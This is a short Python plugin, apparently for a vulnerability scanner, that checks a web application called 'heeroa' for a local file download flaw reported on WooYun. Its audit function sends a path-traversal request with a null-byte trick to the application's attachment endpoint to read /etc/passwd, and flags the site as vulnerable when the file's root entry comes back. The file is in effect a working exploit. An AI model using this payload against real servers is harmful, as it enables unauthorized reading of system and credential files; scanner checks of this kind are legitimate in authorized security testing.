#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'angel'
#refer :http://www.wooyun.org/bugs/wooyun-2014-058386

def assign(service, arg):
    if service == "heeroa":
        return True, arg

def audit(arg):
    url = arg + "/info/infoShowAction.do?accessory=%3f%3f%a1%c0%a8%ba%a1%a4%3f%3f%3f.xls&id=../../../../../../../../../../etc/passwd%00.jpg&method=getAccessory"
    code, head, res, errcode,finalurl =  curl.curl(url)
    if res.find('root:x:0:0:root') != -1 :
        security_hole('Local File download vulnerability:' + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('heeroa', 'http://www.example.com')[1])
